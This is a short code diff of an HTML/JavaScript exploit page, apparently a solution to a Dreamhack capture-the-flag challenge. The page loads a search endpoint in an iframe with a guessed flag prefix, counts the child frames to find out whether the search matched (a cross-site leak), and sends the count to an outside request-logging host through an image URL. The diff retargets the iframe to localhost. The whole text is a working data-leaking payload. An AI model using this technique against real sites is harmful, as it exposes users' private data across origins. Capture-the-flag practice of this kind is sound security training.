@@ -2,11 +2,11 @@
 <img id="img">
 <script>
 	let iframe = document.createElement("iframe");
-	iframe.src = "http://host1.dreamhack.games:11005/search?query=DH{";
+	iframe.src = "http://127.0.0.1:8000/search?query=DH{";
 	document.body.appendChild(iframe);
 	iframe.onload = ()=>{
 		result = iframe.contentWindow.frames.length;
 		console.log(result);
-		img.src = `https://uglumaa.request.dreamhack.games/${iframe.contentWindow.frames.length}`;
+		img.src = `https://uglumaa.request.dreamhack.games/${result}`;
 	};
 </script>
